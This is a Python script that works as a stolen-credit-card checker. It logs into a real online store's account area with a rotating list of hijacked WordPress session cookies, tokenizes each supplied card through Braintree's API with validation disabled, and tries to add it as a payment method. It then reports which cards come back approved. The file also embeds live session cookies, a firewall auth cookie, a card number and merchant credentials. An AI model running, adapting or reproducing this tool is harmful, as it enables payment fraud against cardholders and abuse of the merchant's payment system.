import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''popwbzy%7C1721030303%7C39hrrf9N9Jh3EJ7ua0HLnDHRyQJbrSfpqE9SlinBpMT%7Cc4a5599a1f34d286acbf6e5a369efdcff5b07f25ea03b1754a80ac7f659e1249
ftmhhkchv%7C1721030556%7C2ermfsedMfevEUCTSLaE4tuD9GDrld3yWL6iTwLipAR%7C9efb1c6f928d796b6af8d24cce2e3d71992b9c78f949039531e9cedec529c229

ftmbbhkchv%7C1721037962%7C3wli2pXuLsiSXiVSPxmnd4nMdyJpAOZWOJxgdUDrCPl%7C611dc5a5891f3fe29e63429d489c1ed344c42d9bf32939607f9c417eefa3eea1
ftmkfcfcchv%7C1721038144%7CCCfeYO3OR8x53TAnprtBTloX0dKPOhdkK9OEdvAShnm%7C6eda3e0026a5f5eebba596c958d01247cf9da9735c7d5e3e2cdcb03daecc680e

ftmvhiggkchv%7C1721038311%7C7ZPwr5gqy0AOdriXpM8KukqtOz4gto06FAqHcUqk6at%7C94896e49940aadcb5d2ec1e096f57224c3c985ff923fb658acfc77f6d67d89a7
iishsjdkdkwj%7C1721057160%7Cs40jcI60ieFfDSgz5TQCA21cLLIZZBs24DnY0F5Tg5a%7C11c010e58c0128490d9a656db4f0197c183084b2dd4fe4596fcd80d069322412

kemokmm%7C1721057341%7Cfyth0HJ33Hz1mw8kVFifjpMdKd9Z2fNGne9Ofg2TTPa%7C257f0cc96f03216eb07b6157fa0292ea01b1029013cbbfc0cfbba64067620bdd
'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878997.57.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Connection': 'keep-alive',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878997.57.0.0',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/payment-methods/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://www.huntingtonacademy.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '698e6aaa-6b50-4bf0-adc4-d454c57ef68a',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '10080',
	                    'streetAddress':'Newyork-Presbyterian Ambulance Entrance',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878764.10.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878764.10.0.0',
	    'Origin': 'https://www.huntingtonacademy.com',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"d5e97ccc9f799eb2267d322e412447c7","fraud_merchant_id":null,"correlation_id":"337df1cb3591edc6154038e002f7aa88"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/88yh4wp5qmm383vy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/88yh4wp5qmm383vy"},"merchantId":"88yh4wp5qmm383vy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3184501200456253861","accessToken":"access_token$production$88yh4wp5qmm383vy$046fed997ac2817cff08e18b6195f802","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"Huntington Academy of Permanent Cosmetics","clientId":"AVSrt_PxsQbUo8i9Vf3OcqThKuBqMkQGg-hRLlnTHO9r55agBf5KosAkmqFdhrjvnX-iVNe6p3miaPmP","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"huntingtonacademyofpermanentcosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	return 'كيمو زعلان منك '